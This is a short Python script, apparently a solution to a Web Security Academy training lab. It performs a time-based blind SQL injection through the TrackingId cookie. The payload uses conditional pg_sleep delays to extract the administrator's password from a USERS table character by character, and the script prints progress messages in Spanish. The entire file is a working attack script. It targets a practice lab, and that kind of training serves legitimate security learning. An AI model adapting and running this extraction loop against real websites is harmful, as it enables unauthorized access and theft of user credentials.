import requests;

characters = '0123456789abcdefghijklmnopqrstuvwxyz'

url = 'https://0aa9002b031bf074c0719d8600740030.web-security-academy.net/'
headers = {'content-type': 'application/json', 'Accept-Charset': 'UTF-8'}
def newCookies(pos_pwd, char):
    defaultCookies = { 
        "TrackingId":"fCnA4HaSmcoYXkod" , 
        "session":"I5eOiRgwzJu6rdseXLMmnMQA8LoArHBh"
    }
    payload = f"'|| (SELECT CASE WHEN ( EXISTS (SELECT * FROM USERS WHERE username='administrator' AND SUBSTRING(Password, {pos_pwd}, 1) = '{char}') ) THEN pg_sleep(10) ELSE pg_sleep(0) END)--"
    defaultCookies["TrackingId"] = f"{defaultCookies['TrackingId']}{payload}"
    return defaultCookies


password = []
for pos_pwd in range(1,21):
    for c in characters:
        r = requests.get(url, headers=headers, cookies=newCookies(pos_pwd, c))
        if(r.elapsed.total_seconds() > 8):
            password.append(c)
            print('se consiguio un caracter')
            print(f'contraseña: {"".join(password)}')
            break
            
        print( f"Posición:{pos_pwd} ,Payload: {c}, Tiempo: {r.elapsed.total_seconds()}")
